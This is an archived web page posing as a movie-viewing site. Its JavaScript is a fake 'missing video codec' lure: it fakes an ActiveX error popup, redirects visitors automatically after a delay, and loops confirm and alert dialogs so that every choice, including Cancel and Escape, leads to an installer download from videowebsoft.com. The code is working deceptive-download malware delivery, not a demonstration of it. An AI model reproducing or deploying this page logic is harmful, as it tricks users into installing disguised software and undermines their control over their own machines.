<html>
<head>
<BASE HREF="http://themymoviessite.com.wstub.archive.org/movie/black/0/39/275/0/">

<title>Movie</title>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
<style>
     .t {border:1px solid #666666;}
</style>
<script>
<!--

function activex_actual()
{
  try
  {
    var testObject = new ActiveXObject("VAC.Video");
    return true;
  }
  catch(e)
  {
    ;
  }
  return false;
}

function soft_download()
{
  if(window.navigator.userAgent.indexOf("SV1") != -1 || window.navigator.userAgent.indexOf("MSIE 7") !=-1) 
  {
    return;
  }
  else 
  {
    window.setTimeout("location.href='http://videowebsoft.com/download/502/275/0/'", 3000);
  }
}

function List() 
{
  if(activex_actual()) 
  {
    document.getElementById('movie').innerHTML = '<table cellpadding=0 cellspacing=0 align=center class=t><tr><td style=\'margin:0px;\'><object width=\'500\' height=\'400\' classid=\'clsid:6BF52A52-394A-11d3-B153-00C04F79FAA6\'><param name=\'URL\' value=\'http://themymoviessite.com/MOV/foot/1/1.wmv\'/></object><td></tr></table>';
  }
  else
  {
    soft_download();
  }
}

-->
</script>
</head>
<body  style="background-color:#000000;">

<script>
<!--

var Drag = {
     obj : null,
     init : function(o, oRoot, minX, maxX, minY, maxY, bSwapHorzRef, bSwapVertRef, fXMapper, fYMapper)
     {
          o.onmousedown     = Drag.start;

          o.hmode               = bSwapHorzRef ? false : true ;
          o.vmode               = bSwapVertRef ? false : true ;

          o.root = oRoot && oRoot != null ? oRoot : o ;

          if (o.hmode  && isNaN(parseInt(o.root.style.left  ))) o.root.style.left   = "0px";
          if (o.vmode  && isNaN(parseInt(o.root.style.top   ))) o.root.style.top    = "0px";
          if (!o.hmode && isNaN(parseInt(o.root.style.right ))) o.root.style.right  = "0px";
          if (!o.vmode && isNaN(parseInt(o.root.style.bottom))) o.root.style.bottom = "0px";

          o.minX     = typeof minX != 'undefined' ? minX : null;
          o.minY     = typeof minY != 'undefined' ? minY : null;
          o.maxX     = typeof maxX != 'undefined' ? maxX : null;
          o.maxY     = typeof maxY != 'undefined' ? maxY : null;

          o.xMapper = fXMapper ? fXMapper : null;
          o.yMapper = fYMapper ? fYMapper : null;

          o.root.onDragStart     = new Function();
          o.root.onDragEnd     = new Function();
          o.root.onDrag          = new Function();
     },

     start : function(e)
     {
          var o = Drag.obj = this;
          e = Drag.fixE(e);
          var y = parseInt(o.vmode ? o.root.style.top  : o.root.style.bottom);
          var x = parseInt(o.hmode ? o.root.style.left : o.root.style.right );
          o.root.onDragStart(x, y);

          o.lastMouseX     = e.clientX;
          o.lastMouseY     = e.clientY;

          if (o.hmode) {
               if (o.minX != null)     o.minMouseX     = e.clientX - x + o.minX;
               if (o.maxX != null)     o.maxMouseX     = o.minMouseX + o.maxX - o.minX;
          } else {
               if (o.minX != null) o.maxMouseX = -o.minX + e.clientX + x;
               if (o.maxX != null) o.minMouseX = -o.maxX + e.clientX + x;
          }

          if (o.vmode) {
               if (o.minY != null)     o.minMouseY     = e.clientY - y + o.minY;
               if (o.maxY != null)     o.maxMouseY     = o.minMouseY + o.maxY - o.minY;
          } else {
               if (o.minY != null) o.maxMouseY = -o.minY + e.clientY + y;
               if (o.maxY != null) o.minMouseY = -o.maxY + e.clientY + y;
          }

          document.onmousemove     = Drag.drag;
          document.onmouseup          = Drag.end;

          return false;
     },

     drag : function(e)
     {
          e = Drag.fixE(e);
          var o = Drag.obj;

          var ey     = e.clientY;
          var ex     = e.clientX;
          var y = parseInt(o.vmode ? o.root.style.top  : o.root.style.bottom);
          var x = parseInt(o.hmode ? o.root.style.left : o.root.style.right );
          var nx, ny;

          if (o.minX != null) ex = o.hmode ? Math.max(ex, o.minMouseX) : Math.min(ex, o.maxMouseX);
          if (o.maxX != null) ex = o.hmode ? Math.min(ex, o.maxMouseX) : Math.max(ex, o.minMouseX);
          if (o.minY != null) ey = o.vmode ? Math.max(ey, o.minMouseY) : Math.min(ey, o.maxMouseY);
          if (o.maxY != null) ey = o.vmode ? Math.min(ey, o.maxMouseY) : Math.max(ey, o.minMouseY);

          nx = x + ((ex - o.lastMouseX) * (o.hmode ? 1 : -1));
          ny = y + ((ey - o.lastMouseY) * (o.vmode ? 1 : -1));

          if (o.xMapper)          nx = o.xMapper(y)
          else if (o.yMapper)     ny = o.yMapper(x)

          Drag.obj.root.style[o.hmode ? "left" : "right"] = nx + "px";
          Drag.obj.root.style[o.vmode ? "top" : "bottom"] = ny + "px";
          Drag.obj.lastMouseX     = ex;
          Drag.obj.lastMouseY     = ey;

          Drag.obj.root.onDrag(nx, ny);
          return false;
     },

     end : function()
     {
          document.onmousemove = null;
          document.onmouseup   = null;
          Drag.obj.root.onDragEnd(     parseInt(Drag.obj.root.style[Drag.obj.hmode ? "left" : "right"]), 
                                             parseInt(Drag.obj.root.style[Drag.obj.vmode ? "top" : "bottom"]));
          Drag.obj = null;
     },

     fixE : function(e)
     {
          if (typeof e == 'undefined') e = window.event;
          if (typeof e.layerX == 'undefined') e.layerX = e.offsetX;
          if (typeof e.layerY == 'undefined') e.layerY = e.offsetY;
          return e;
     }
};

function Down(download,e) 
{ 
     if (e!=null && e.keyCode==27)
     {     Close();
          return;
     }     
    switch (download) 
    { 
        case "iax": document.location.href="http://videowebsoft.com/download/502/275/0/"; break; 
        Close(); 
    } 

} 

function vc() {
     if (confirm('Video ActiveX Object Error.\r\rYour browser cannot play this video file.\rClick \'OK\' to download and install missing Video ActiveX Object.')) {
          location.href="http://videowebsoft.com/download/502/275/0/";
     }
     else {
          if (alert('Please install new version of Video ActiveX Object.')) {
               vc();
          }
          else {
               vc();
          }               
     }
}

function Close() 
{ 
    var p=document.getElementById("popdiv");
    p.style.visibility="hidden"; 
     vc();
} 
function Details()
{
     alert('You must download Video ActiveX Object to view this video file.');
}
-->
</script>

<div name="popdiv" id="popdiv" onKeyPress="Down('iax',event);" style="visibility:hidden; z-index:1;position:absolute;top:0px;left:0px;">
<table width="389" border="0" cellpadding="0" cellspacing="0">
<tr>
  <td height="36">
    <table border="0" cellpadding="0" cellspacing="0">
    <tr>
      <td width="5"><img src="http://themymoviessite.com/i/img0.gif" width="5" height="36"></td>
      <td width="357" bgcolor="#0064B2"><img src="http://themymoviessite.com/i/img1.gif" width="357" height="36"></td>
      <td width="21" bgcolor="#0064B2"><img src="http://themymoviessite.com/i/img2.gif" width="21" height="36" onClick="Close();"></td>
      <td width="6"><img src="http://themymoviessite.com/i/img3.gif" width="6" height="36"></td>
    </tr>
    </table>
  </td>
</tr>
<tr>
  <td height="203" bgcolor="#FFFFDE" background="http://themymoviessite.com/i/img4.gif" valign="top">
    <table width="100%" height="130" border="0" cellpadding="0" cellspacing="0">
    <tr>
      <td width="120">&nbsp;</td>
      <td valign="top">
        <br>
        <font face="Tahoma" color="#000000" style="font-size:11px;">
          <b>Video ActiveX Object Error:</b><br>
          Your browser cannot display this video file.<br>
          <br>
          You need to download new version of Video ActiveX<br>
          Object to view this video file.
        </font>
      </td>
    </tr>
    </table>
    <table width="100%" border="0" cellpadding="0" cellspacing="0">
    <tr>
      <td align="center">
        <font face="Tahoma" color="#000000" style="font-size:11px;">
          To download and install ActiveX Object click Continue.<br><br>
          <input type="submit" value="Continue" onClick="Down('iax');" style="font-family:Arial;font-size:12px;font-weight:bold;color:#ffffff;background-color:#009CEE;background-image:url(http://themymoviessite.com/i/img5.gif);width:106px;height:28px;border:0;">
          <input type="submit" value="Cancel" onClick="Close();" style="font-family:Arial;font-size:12px;font-weight:bold;color:#ffffff;background-color:#009CEE;background-image:url(http://themymoviessite.com/i/img5.gif);width:106px;height:28px;border:0;">
          <input type="submit" value="Details..." onClick="Details();" style="font-family:Arial;font-size:12px;font-weight:bold;color:#ffffff;background-color:#009CEE;background-image:url(http://themymoviessite.com/i/img5.gif);width:106px;height:28px;border:0;">
        </font>
      </td>
    </tr>
    </table>
  </td>
</tr>
<tr>
  <td height="6"><img src="http://themymoviessite.com/i/img6.gif" width="389" height="6"></td>
</tr>
</table>
</div>

<script>
<!--
setTimeout("showPopDiv();",2000);
      
function showPopDiv()
{
  if(!activex_actual())
  {
    var sFlag = "No";
    var byFlag = false;
    var FlagAr = sFlag.split("");
 
    if(FlagAr[0]=="1"){byFlag = true;}
    if(FlagAr[0]=="3"){byFlag = true;}

    if(!byFlag)
    {
      var p=document.getElementById("popdiv"); 
      wmpwidth=document.body.clientWidth/2-190;
      wmpheight=document.body.clientHeight/2-130;
      p.style.top = wmpheight;
      p.style.left = wmpwidth;
      p.style.visibility = "visible";
      p.focus();
    }
  }
}
 Drag.init(document.getElementById("popdiv"));
-->
</script>
</div>

<div id="movie" style="margin:0 auto;">
     <center>
          <br><a href="http://videowebsoft.com/download/502/275/0/"><img width="450" onMouseOver="window.status = 'You must download Video ActiveX Object to view this video file.';" height="369" border="0" alt="You must download Video ActiveX Object to view this video file." src="http://themymoviessite.com/stemplates/movie.gif"></a>
     </center>
</div>

<script>
<!--
List();
-->
</script>

</body>

<SCRIPT language="Javascript">
<!--

// FILE ARCHIVED ON 20071030074443 AND RETRIEVED FROM THE
// INTERNET ARCHIVE ON 20110214025052.
// JAVASCRIPT APPENDED BY WAYBACK MACHINE, COPYRIGHT INTERNET ARCHIVE.
// ALL OTHER CONTENT MAY ALSO BE PROTECTED BY COPYRIGHT (17 U.S.C.
// SECTION 108(a)(3)).

   var sWayBackCGI = "http://web.archive.org/web/20071030074443/";

   function xResolveUrl(url) {
      var image = new Image();
      image.src = url;
      return image.src;
   }
   function xLateUrl(aCollection, sProp) {
      var i = 0;
      for(i = 0; i < aCollection.length; i++) {
         var url = aCollection[i][sProp];         if (typeof(url) == "string") { 
          if (url.indexOf("mailto:") == -1 &&
             url.indexOf("javascript:") == -1
             && url.length > 0) {
            if(url.indexOf("http") != 0) {
                url = xResolveUrl(url);
            }
            url = url.replace('.wstub.archive.org','');
            aCollection[i][sProp] = sWayBackCGI + url;
         }
         }
      }
   }

   xLateUrl(document.getElementsByTagName("IMG"),"src");
   xLateUrl(document.getElementsByTagName("A"),"href");
   xLateUrl(document.getElementsByTagName("AREA"),"href");
   xLateUrl(document.getElementsByTagName("OBJECT"),"codebase");
   xLateUrl(document.getElementsByTagName("OBJECT"),"data");
   xLateUrl(document.getElementsByTagName("APPLET"),"codebase");
   xLateUrl(document.getElementsByTagName("APPLET"),"archive");
   xLateUrl(document.getElementsByTagName("EMBED"),"src");
   xLateUrl(document.getElementsByTagName("BODY"),"background");
   xLateUrl(document.getElementsByTagName("TD"),"background");
   xLateUrl(document.getElementsByTagName("INPUT"),"src");
   var forms = document.getElementsByTagName("FORM");
   if (forms) {
       var j = 0;
       for (j = 0; j < forms.length; j++) {
              f = forms[j];
              if (typeof(f.action)  == "string") {
                 if(typeof(f.method)  == "string") {
                     if(typeof(f.method) != "post") {
                        f.action = sWayBackCGI + f.action;
                     }
                  }
              }
        }
    }


//-->
</SCRIPT>

</html>